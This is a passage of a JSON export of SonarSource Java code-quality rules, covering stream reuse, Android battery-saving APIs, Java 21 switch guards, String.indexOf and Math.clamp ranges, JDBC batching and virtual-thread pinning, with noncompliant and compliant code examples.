functionality to an interface that both can\n  implement. This allows each class to depend on the interface rather than on each other. </li>\n  <li> <strong>Use dependency injection</strong>: Replace direct references between classes with dependency injection. By passing necessary objects as\n  parameters through constructors or setters, you break the circular reference, making your code more flexible and easier to test. </li>\n  <li> <strong>Split responsibilities</strong>: Evaluate whether each class is handling too many responsibilities. If so, break them down into\n  smaller, more focused classes. This eliminates circular dependencies and makes sure your code has fewer reasons to change, making it easier to\n  manage and extend. </li>\n</ol>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code contains two cycles: Order â Customer â Order, and Order â Product â Order. Furthermore, both cycles are connected to each other\nvia class Order. This is called <em>a tangle consisting of two cycles</em>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Order {\n    public Customer customer;\n    public List&lt;Product&gt; products;\n}\nclass Customer {\n    public List&lt;Order&gt; orders;\n}\nclass Product {\n    public List&lt;Order&gt; orders;\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The issue can be resolved by changing the structure. Two service functions can replace the dependencies Customer â Order and Product â Order.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Order {\n    public Customer customer;\n    public List&lt;Product&gt; products;\n}\nclass Customer { }\nclass Product { }\ninterface OrderService {\n  List&lt;Order&gt; getOrdersByCustomer(Customer customer);\n  List&lt;Order&gt; getOrdersByProduct(Product product);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Acyclic_dependencies_principle\">Acyclic dependencies principle</a> </li>\n  <li> STAN - <a href=\"https://stan4j.com/advanced/adp/\">Acyclic dependencies principle</a> </li>\n  <li> RSPEC - <a href=\"https://sonarsource.github.io/rspec/#/rspec/{rule:java:S7091}/java\">{rule:java:S7091}: Circular dependencies between classes\n  across package boundaries should be resolved</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-7027","summary":"Circular dependencies between classes in the same package should be resolved","tags":["architecture","design"],"versions":{"serverEdition":"Developer","serverVersion":"sqs-10.8.1.101195","communityVersion":null},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Stream operations are divided into intermediate and terminal operations, and are combined to form stream pipelines. A stream should be operated on\n(invoking an intermediate or terminal stream operation) only once.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nStream&lt;Widget&gt; pipeline = widgets.stream().filter(b -&gt; b.getColor() == Color.RED);\nvar res1 = pipeline.findAny();\nvar res2 = pipeline.mapToInt(b -&gt; b.getWeight()).sum(); // Noncompliant\n</pre>\n<h2>Resources</h2>\n<p><a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps\">Stream Operations</a></p>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6976","summary":"Consumed Stream pipelines should not be reused","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"10.7.0.96327","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p><code>BluetoothGATT</code> is a class to provide a functionality to enable communication with Bluetooth Smart or Smart Ready devices.</p>\n<p>To connect to a remote peripheral device, a <code>BluetoothGattCallback</code> is used and a method <code>BluetoothDevice#connectGatt</code> is\nused to get an instance of this class. GATT-capable devices can be discovered using the Bluetooth device discovery or BLE scan process.</p>\n<h2>Why is this an issue?</h2>\n<p>Using high power consumption modes for Bluetooth operations can drain the device battery faster and may not be suitable for scenarios where power\nefficiency is crucial.</p>\n<p>This rule identifies instances where high power consumption Bluetooth operations are used, specifically when <code>requestConnectionPriority</code>\nor <code>setAdvertiseMode</code> methods are invoked with arguments other than those promoting low power consumption.</p>\n<h2>How to fix it</h2>\n<ul>\n  <li> Use <code>CONNECTION_PRIORITY_LOW_POWER</code> for <code>requestConnectionPriority</code> method. </li>\n  <li> Use <code>ADVERTISE_MODE_LOW_POWER</code> for <code>setAdvertiseMode</code> method to promote low power consumption. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class BluetoothExample {\n    private final BluetoothGattCallback gattCallback = new BluetoothGattCallback() {\n        @Override\n        public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) {\n          // ...\n        }\n\n        @Override\n        public void onServicesDiscovered(BluetoothGatt gatt, int status) {\n            if (status == BluetoothGatt.GATT_SUCCESS) {\n                gatt.requestConnectionPriority(BluetoothGatt.CONNECTION_PRIORITY_HIGH); // Noncompliant\n            }\n        }\n    };\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class BluetoothExample {\n   private final BluetoothGattCallback gattCallback = new BluetoothGattCallback() {\n        @Override\n        public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) {\n          // ...\n        }\n\n        @Override\n        public void onServicesDiscovered(BluetoothGatt gatt, int status) {\n            if (status == BluetoothGatt.GATT_SUCCESS) {\n                gatt.requestConnectionPriority(BluetoothGatt.CONNECTION_PRIORITY_LOW_POWER); // Compliant\n            }\n        }\n    };\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic class BluetoothExample {\n    private void startAdvertising() {\n        AdvertiseSettings.Builder settingsBuilder = new AdvertiseSettings.Builder();\n        settingsBuilder.setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY); // Noncompliant\n        // Other settings configuration...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic class BluetoothExample {\n    private void startAdvertising() {\n        AdvertiseSettings.Builder settingsBuilder = new AdvertiseSettings.Builder();\n        settingsBuilder.setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_POWER); // Compliant\n        // Other settings configuration...\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://developer.android.com/reference/android/bluetooth/BluetoothGattCallback\">Android Developers - BluetoothGattCallback</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/bluetooth/BluetoothGatt\">Android Developers - BluetoothGatt</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/bluetooth/BluetoothDevice\">Android Developers - BluetoothDevice</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/bluetooth/le/AdvertiseSettings.Builder\">Android Developers -\n  AdvertiseSettings.Builder</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6926","summary":"Bluetooth should be configured to use low power","tags":["android","sustainability"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>The <code>android.hardware.SensorManager#getDefaultSensor</code> offers two types of Motion Sensors:</p>\n<ul>\n  <li> <code>TYPE_ROTATION_VECTOR:</code> a combination of the gyroscope, accelerometer, and magnetometer. </li>\n  <li> <code>TYPE_GEOMAGNETIC_ROTATION_VECTOR:</code> a combination of the accelerometer and magnetometer. </li>\n</ul>\n<h2>Why is this an issue?</h2>\n<p>The battery life is a major concern for mobile devices and choosing the right Sensor is very important to reduce the power usage and extend the\nbattery life.</p>\n<p>It is recommended, for reducing the power usage, to use <code>TYPE_GEOMAGNETIC_ROTATION_VECTOR</code> for <em>background tasks</em>,\n<em>long-running tasks</em> and other tasks not requiring accurate motion detection.</p>\n<p>The rule reports an issue when <code>android.hardware.SensorManager#getDefaultSensor</code> uses <code>TYPE_ROTATION_VECTOR</code> instead of\n<code>TYPE_GEOMAGNETIC_ROTATION_VECTOR</code>.</p>\n<h2>How to fix it</h2>\n<p>Replace <code>TYPE_ROTATION_VECTOR</code> with <code>TYPE_GEOMAGNETIC_ROTATION_VECTOR</code> when retrieving the Motion Sensor.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class BackGroundActivity extends Activity {\n\n    private Sensor motionSensor;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        SensorManager sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);\n        motionSensor = sensorManager.getDefaultSensor(Sensor.TYPE_ROTATION_VECTOR); // Noncompliant\n        // ..\n    }\n    //..\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class BackGroundActivity extends Activity {\n\n    private Sensor motionSensor;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        SensorManager sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);\n        motionSensor = sensorManager.getDefaultSensor(Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR); // Compliant\n        // ..\n    }\n    //..\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://source.android.com/docs/core/interaction/sensors/power-use\">Android - Low Power Sensors</a> </li>\n  <li> <a href=\"https://developer.android.com/develop/sensors-and-location/sensors/sensors_motion\">Android - Motion Sensors</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6923","summary":"Motion Sensor should not use gyroscope","tags":["android","sustainability"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Java 21 has introduced enhancements to switch statements and expressions, allowing them to operate on any type, not just specific ones, as in\nprevious versions. Furthermore, case labels have been upgraded to support patterns, providing an alternative to the previous restriction of only\naccepting constants.</p>\n<pre>\n// As of Java 21\nString patternMatchSwitch(Object obj) {\n    return switch (obj) {\n        case String s  -&gt; String.format(\"String %s\", s);\n        case Integer i -&gt; String.format(\"int %d\", i);\n        default        -&gt; obj.toString();\n    };\n}\n</pre>\n<p>This allows to use the <code>when</code> keyword to specify a condition for a case label, also called a guarded case label.</p>\n<pre>\nString guardedCaseSwitch(Object obj) {\n    return switch (obj) {\n        case String s when s.length() &gt; 0 -&gt; String.format(\"String %s\", s);\n        case Integer i when i &gt; 0 -&gt; String.format(\"int %d\", i);\n        default        -&gt; obj.toString();\n    };\n}\n</pre>\n<p>This syntax is more readable and less error-prone than using an if statement inside the case block and should be preferred.</p>\n<p>This rule reports an issue when a single <code>if</code> statement is used inside a case block.</p>\n<h2>How to fix it</h2>\n<p>Replace the <code>if</code> statement with a guarded case label.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid testObject(Object response) {\n    switch (response) {\n        case String s -&gt; {\n            if(s.length() &gt; 80) { // Noncompliant; use the \"when\" keyword\n                System.out.println(\"This string is too long\");\n            }\n        }\n        case Integer i -&gt; {\n            if(i &gt; 80) { // Noncompliant; use the \"when\" keyword\n                System.out.println(\"This integer is too big\");\n            }\n        }\n        default -&gt; System.out.println(\"Unknown type\");\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid testObject(Object response) {\n    switch (response) {\n        case String s when s.length() &gt; 80 -&gt; {\n            System.out.println(\"This string is too long\");\n        }\n        case Integer i when i &gt; 80 -&gt; {\n            System.out.println(\"This integer is too big\");\n        }\n        default -&gt; System.out.println(\"Unknown type\");\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://openjdk.org/jeps/441\">Pattern Matching for switch</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6916","summary":"Use when instead of a single if inside a pattern match body","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Java 21 adds new <code>String.indexOf</code> methods that accept ranges (<code>beginIndex</code>, to <code>endIndex</code>) rather than just a\nstart index. A <code>StringIndexOutOfBounds</code> can be thrown when indicating an invalid range, namely when:</p>\n<ul>\n  <li> <code>beginIndex &gt; endIndex</code> (eg: <code>beginIndex</code> and <code>endIndex</code> arguments are mistakenly reversed) </li>\n  <li> <code>beginIndex &lt; 0</code> (eg: because the older <code>String.indexOf(what, fromIndex)</code> accepts negative values) </li>\n</ul>\n<h2>How to fix it</h2>\n<ul>\n  <li> Use <code>String.indexOf(what, beginIndex, endIndex)</code> instead of <code>String.indexOf(what, endIndex, beginIndex)</code>. </li>\n  <li> Use <code>String.indexOf(what, 0, endIndex)</code> instead of <code>String.indexOf(what, -1, endIndex)</code>. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString hello = \"Hello, world!\";\nint index = hello.indexOf('o', 11, 7); // Noncompliant, 11..7 is not a valid range\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString hello = \"Hello, world!\";\nint index = hello.indexOf('o', 7, 11); // Compliant\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nString hello = \"Hello, world!\";\nint index = hello.indexOf('o', -1, 11); // Noncompliant, because beginIndex is negative\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nString hello = \"Hello, world!\";\nint index = hello.indexOf('o', 0, 11); // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/String.html#indexOf(int,int,int)\">String.indexOf(int, int, int)</a>\n  </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/String.html#indexOf(java.lang.String,int,int)\">String.indexOf(java.lang.String,int,int)</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6915","summary":"\"String.indexOf\" should be used with correct ranges","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Location awareness is a common feature for mobile application that enhance the user experience by providing context-specific services.</p>\n<h2>Why is this an issue?</h2>\n<p>The location awareness feature can significantly drain the deviceâs battery.</p>\n<p>The recommended way to maximize the battery life is to use the <em>fused location provider</em> which combines signals from GPS, Wi-Fi, and cell\nnetworks, as well as accelerometer, gyroscope, magnetometer and other sensors. The <code>FusedLocationProviderClient</code> automatically chooses the\nbest method to retrieve a deviceâs location based on the deviceâs context.</p>\n<p>The rule flags an issue when <code>android.location.LocationManager</code> or <code>com.google.android.gms.location.LocationClient</code> is used\ninstead of <code>com.google.android.gms.location.FusedLocationProviderClient</code>.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <em>Usability</em>: the non-optimized location API consumer more battery. </li>\n  <li> <em>Sustainability</em>: the extra energy required has a negative impact on the environment. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Replace the usages of <code>android.location.LocationManager</code> or <code>com.google.android.gms.location.LocationClient</code> with\n<code>com.google.android.gms.location.FusedLocationProviderClient</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class LocationsActivity extends Activity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        // ...\n\n        LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE); // Noncompliant\n\n        LocationListener locationListener = new LocationListener() {\n            public void onLocationChanged(Location location) {\n                // Use the location object as needed\n            }\n        };\n\n        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class LocationsActivity extends Activity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        // ...\n\n        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(this); // Compliant\n\n        fusedLocationClient.getLastLocation()\n            .addOnSuccessListener(this, location -&gt; {\n                // Use the location object as needed\n            });\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://developers.google.com/android/reference/com/google/android/gms/location/FusedLocationProviderClient.html\">Google Play Services\n  - FusedLocationProviderClient</a> </li>\n  <li> <a href=\"https://developer.android.com/develop/sensors-and-location/location/battery\">Android Developers - Optimize location for battery</a>\n  </li>\n  <li> <a href=\"https://developer.android.com/reference/android/location/package-summary\">Android Developers - Android Location</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6914","summary":"Use Fused Location to optimize battery power","tags":["android","sustainability"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Java 21 introduces the new method <code>Math.clamp(value, min, max)</code> that fits a value within a specified interval. Before Java 21, this\nbehavior required explicit calls to the <code>Math.min</code> and <code>Math.max</code> methods, as in <code>Math.min(max, Math.max(value,\nmin))</code>.</p>\n<p>If <code>min &gt; max</code>, <code>Math.clamp</code> throws an <code>IllegalArgumentException</code>, indicating an invalid interval. This can\noccur if the <code>min</code> and <code>max</code> arguments are mistakenly reversed.</p>\n<p>Note that <code>Math.clamp</code> is not a general substitute for <code>Math.min</code> or <code>Math.max</code>, but for the combination of both.\nIf <code>value</code> is the same as <code>min</code> or <code>max</code>, using <code>Math.clamp</code> is unnecessary and <code>Math.min</code> or\n<code>Math.max</code> should be used instead.</p>\n<h2>How to fix it</h2>\n<ul>\n  <li> If 2nd argument &gt; 3rd argument, use <code>Math.clamp(value, min, max)</code> instead of <code>Math.clamp(value, max, min)</code>. </li>\n  <li> If <code>value</code> is the same as <code>min</code>, fix the logic or use <code>Math.min(value, max)</code> instead. </li>\n  <li> If <code>value</code> is the same as <code>max</code>, fix the logic or use <code>Math.max(min, value)</code> instead. </li>\n  <li> If <code>min</code> is the same as <code>max</code>, fix the logic because <code>Math.clamp(value, x, x)</code> will always return\n  <code>x</code>. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nMath.clamp(red, 255, 0); // Noncompliant, [255,0] is not a valid range\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nMath.clamp(red, 0, 255); // Compliant\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nMath.clamp(red, red, 255); // Noncompliant, use Math.min(red, 255)\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nMath.min(red, 255); // Compliant\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nMath.clamp(red, 0, red); // Noncompliant, use Math.max(red, 0)\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nMath.max(red, 0); // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Math.html#clamp(long,int,int)\">Math.clamp</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6913","summary":"\"Math.clamp\" should be used with correct ranges","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Executing a batch of SQL queries instead of individual queries improves performance by reducing communication overhead with the database.</p>\n<p>Batching SQL statements is beneficial in common situations where a SQL statement is executed within a loop. In such cases, adding the statement to\na batch and subsequently executing it reduces the number of interactions with the database. This results in improved efficiency and faster execution\ntimes.</p>\n<p>The rule raises an issue when it detects a <code>java.sql.Statement</code> being executed within a loop instruction, such as <code>for</code>,\n<code>while</code> or the <code>forEach</code> method of <code>java.lang.Iterable</code>, <code>java.util.Map</code> and\n<code>java.util.stream.Stream</code>.</p>\n<h2>How to fix it</h2>\n<p>Group SQL statements by using the method <code>addBatch</code> to add them to a batch and then execute them using <code>executeBatch</code> to send\nthem to the database in a single call.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void execute(Connection connection) {\n  try {\n    Statement statement = connection.createStatement();\n\n    for (int i = 0; i &lt; 10; i++) {\n      statement.execute(\"INSERT INTO myTable (column1, column2) VALUES (\" + i + \", 'value\" + i + \"')\"); // Noncompliant\n    }\n\n    statement.close();\n    connection.close();\n  } catch (SQLException e) {\n    e.printStackTrace();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void execute(Connection connection) {\n  try {\n    Statement statement = connection.createStatement();\n\n    for (int i = 0; i &lt; 10; i++) {\n      statement.addBatch(\"INSERT INTO myTable (column1, column2) VALUES (\" + i + \", 'value\" + i + \"')\"); // Compliant\n    }\n    statement.executeBatch();\n\n    statement.close();\n    connection.close();\n  } catch (SQLException e) {\n    e.printStackTrace();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.sql/java/sql/Statement.html\">Oracle Java SE 21 API - java.sql.Statement</a>\n  </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.sql/java/sql/PreparedStatement.html\">Oracle Java SE 21 API -\n  java.sql.PreparedStatement</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/jdbc-batch-processing\">Baeldung - JDBC Batch Processing</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6912","summary":"Use batch Processing in JDBC","tags":["sustainability","sql"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>The <code>java.sql.PreparedStatement</code> represents a precompiled SQL statement that can be efficiently executed multiple times.</p>\n<h2>Why is this an issue?</h2>\n<p>The <code>PreparedStatement</code> is frequently used in loops because it allows to conveniently set parameters. A small optimization is possible\nby setting constant parameters outside the loop or hard-coding them in the query whenever possible.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <em>Performance</em>: the unnecessary calls to the setter methods bring overhead. </li>\n  <li> <em>Sustainability</em>: the extra overhead has a negative impact on the environment. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Place calls to setter methods that take a constant argument outside the loop.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class DatabaseExample {\n\n    public record Order(String id, BigDecimal price) {}\n\n    public void updateTodayOrders(Connection connection, List&lt;Order&gt; orders) {\n            Date today = java.sql.Date.valueOf(LocalDate.now());\n            String insertQuery = \"INSERT INTO Order (id, price, executionDate) VALUES (?, ?, ?)\";\n            PreparedStatement preparedStatement = connection.prepareStatement(insertQuery);\n\n            for(Order order: orders) {\n                preparedStatement.setString(1, order.id());\n                preparedStatement.setString(2, order.price());\n                preparedStatement.setDate(3, today); // Noncompliant\n                preparedStatement.executeUpdate();\n            }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class DatabaseExample {\n\n    public record Order(String id, BigDecimal price) {}\n\n    public void updateTodayOrders(Connection connection, List&lt;Order&gt; orders) {\n            Date today = java.sql.Date.valueOf(LocalDate.now());\n            String insertQuery = \"INSERT INTO Order (id, price, executionDate) VALUES (?, ?, ?)\";\n            PreparedStatement preparedStatement = connection.prepareStatement(insertQuery);\n\n            preparedStatement.setDate(3, today); // Compliant\n            for(Order order: orders) {\n                preparedStatement.setString(1, order.id());\n                preparedStatement.setString(2, order.price());\n                preparedStatement.executeUpdate();\n            }\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.sql/java/sql/PreparedStatement.html\">Oracle SDK - PreparedStatement</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html\">Oracle Tutorial - Using Prepared Statements</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6909","summary":"Constant parameters in a \"PreparedStatement\" should not be set more than once","tags":["sql","sustainability"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Java virtual threads enable the JVM to optimize the use of OS threads by mounting and unmounting them as needed. This makes them more efficient\nwhen dealing with blocking operations such as I/O or HTTP requests.</p>\n<p>This rule applies only to code running on Java versions older than 24. Since Java 24, virtual threads are no longer pinned when executing\n<code>synchronized</code> code.</p>\n<p>For Java version 21 to 23, when code is executed inside a <code>synchronized</code> block or method, the virtual thread remains pinned to its\nunderlying OS thread and cannot be unmounted during a blocking operation. This causes the OS thread to be blocked, which can impact the scalability of\nthe application.</p>\n<p>Therefore, in environments running a Java version below 24, virtual threads should not execute code that contains <code>synchronized</code> blocks\nor invokes <code>synchronized</code> methods. Platform threads should be used in these cases instead.</p>\n<p>This rule raises an issue when a virtual thread contains <code>synchronized</code> blocks or invokes <code>synchronized</code> methods.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid enqueue(){\n    Thread.startVirtualThread(() -&gt; { // Noncompliant; use a platform thread instead\n            setupOperations();\n            dequeLogic();\n        }\n    });\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid enqueue(){\n    new Thread(() -&gt; {\n        synchronized {\n            setupOperations();\n            dequeLogic();\n        }\n    }).start();\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nvoid enqueue2(){\n    Thread.startVirtualThread(() -&gt; { // Noncompliant; use a platform thread instead of a virtual one\n        if(someCondition){\n            synchronizedMethod();\n        }else{\n            defaultLogic();\n        }\n    });\n}\nsynchronized void synchronizedMethod(){}\nvoid defaultLogic(){}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nvoid enqueue2(){\n    new Thread(() -&gt; {\n        if(someCondition){\n            synchronizedMethod();\n        }else{\n            defaultLogic();\n        }\n    }).start();\n}\nsynchronized void synchronizedMethod(){}\nvoid defaultLogic(){}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://openjdk.org/jeps/444#:~:text=There%20are%20two,by%20capturing%20carriers\">Virtual threads, pinning\n  scenarios</a> </li>\n  <li> Java Documentation - <a href=\"https://openjdk.org/jeps/491\">Synchronize Virtual Threads without Pinning</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6906","summary":"Virtual threads should not run tasks that include synchronized code","tags":["java21","multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>The <em>Java Database Connectivity (JDBC) API</em> provides the 